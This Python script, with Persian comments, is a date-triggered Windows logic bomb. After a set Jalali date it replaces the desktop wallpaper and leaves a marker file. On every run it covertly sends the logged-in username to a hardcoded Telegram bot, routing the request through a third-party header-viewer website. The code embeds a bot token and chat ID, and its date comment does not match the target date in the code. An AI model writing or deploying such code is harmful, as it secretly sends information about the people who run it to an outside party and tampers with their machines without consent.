import ctypes
from PIL import Image
import io
import base64
import jdatetime
import os
import requests

SPI_SETDESKWALLPAPER = 20
my_bot_token = "6784243877:AAG58bNMvwp6kEdUvG2bX2C2L1dGCKrbpLI"
chat_id = "1663788795"


def set_wallpaper():
   # تبدیل داده باینری به تصویر
    image_data = ""
    image = Image.open(io.BytesIO(base64.b64decode(image_data)))

    image_path = r"C:\Windows\Temp\temp.png"
    image.save(image_path)

    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

# تاریخ مورد نظر را در اینجا وارد کنید
target_date = jdatetime.date(1402, 11, 4)  # 22 بهمن 1402

# تاریخ کنونی
now = jdatetime.date.today()

if now > target_date:
    # بررسی اینکه آیا کد قبلا اجرا شده است یا خیر
    if not os.path.exists('code_executed.txt'):
        print("now")
        set_wallpaper()
        
        # ذخیره وضعیت کد
        with open('code_executed.txt', 'w') as f:
            f.write('The code has been executed.')

        user_name = os.getlogin()
        message = f"name: {user_name}\nNow"
        url = f"https://api.telegram.org/bot{my_bot_token}/sendmessage?chat_id={chat_id}&text={message}"
        mypay = {"UrlBox":url,
        "AgentBox":"Google Chrome",
        "VersionsList":"HTTP/1.1",
        "MethodList":"GET"}
        send = requests.post(url="https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay)

else:
    print("NOT now")
    user_name = os.getlogin()
    message = f"name: {user_name}\nNOT now"
    url = f"https://api.telegram.org/bot{my_bot_token}/sendmessage?chat_id={chat_id}&text={message}"
    mypay = {"UrlBox":url,
    "AgentBox":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"GET"}
    send = requests.post(url="https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay)